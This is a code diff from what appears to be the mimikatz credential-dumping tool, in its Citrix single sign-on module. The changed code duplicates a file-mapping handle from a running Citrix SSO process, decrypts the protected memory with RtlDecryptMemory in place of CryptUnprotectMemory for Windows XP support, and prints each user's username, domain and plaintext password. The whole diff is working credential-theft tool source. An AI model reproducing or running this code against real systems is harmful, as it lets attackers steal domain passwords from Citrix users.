@@ -21,12 +21,9 @@ BOOL CALLBACK Citrix_Each_SSO_Program(PSYSTEM_PROCESS_INFORMATION pSystemProcess
 {
 	DWORD i, ProcessId;
 	HANDLE hProcess;
-	//PKULL_M_MEMORY_HANDLE hMemory;
-	//KULL_M_MEMORY_ADDRESS aMemory = { NULL, &hMemory };
 	RTL_USER_PROCESS_PARAMETERS UserProcessParameters;
 	KULL_M_MEMORY_ADDRESS aRemote = {NULL, NULL}, aBuffer = {&UserProcessParameters, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	PEB Peb;
-	
 
 	UNREFERENCED_PARAMETER(pvArg);
 
@@ -112,6 +109,7 @@ void Citrix_SSO_Program_FileMapping(HANDLE hRemoteProcess, HANDLE hRemoteFileMap
 	HANDLE hFileMapping;
 	PCITRIX_PACKED_CREDENTIALS pCitrixPackedCredentials;
 	PCITRIX_CREDENTIALS pCitrixCredentials;
+	NTSTATUS nStatus;
 
 	if (DuplicateHandle(hRemoteProcess, hRemoteFileMapping, GetCurrentProcess(), &hFileMapping, FILE_MAP_READ, FALSE, 0))
 	{
@@ -123,12 +121,13 @@ void Citrix_SSO_Program_FileMapping(HANDLE hRemoteProcess, HANDLE hRemoteFileMap
 			if (pCitrixCredentials)
 			{
 				RtlCopyMemory(pCitrixCredentials, pCitrixPackedCredentials->Data, sizeof(pCitrixPackedCredentials->Data));
-				if (CryptUnprotectMemory(pCitrixCredentials, sizeof(pCitrixPackedCredentials->Data), CRYPTPROTECTMEMORY_CROSS_PROCESS))
+				nStatus = RtlDecryptMemory(pCitrixCredentials, sizeof(pCitrixPackedCredentials->Data), RTL_ENCRYPT_OPTION_CROSS_PROCESS); // CryptUnprotectMemory is not Windows XP friendly
+				if (nStatus == STATUS_SUCCESS)
 				{
 					CitrixPasswordDesobfuscate((PBYTE)pCitrixCredentials->password, pCitrixCredentials->cbPassword);
 					kprintf(L"| Username  : %s\n| Domain    : %s\n| Password  : %.*s\n| flags/type: 0x%08x\n", pCitrixCredentials->username, pCitrixCredentials->domain, pCitrixCredentials->cbPassword, pCitrixCredentials->password, pCitrixCredentials->dwFlags);
 				}
-				else PRINT_ERROR_AUTO(L"CryptUnprotectMemory");
+				else PRINT_ERROR_NUMBER(L"RtlDecryptMemory", nStatus);
 
 				LocalFree(pCitrixCredentials);
 			}
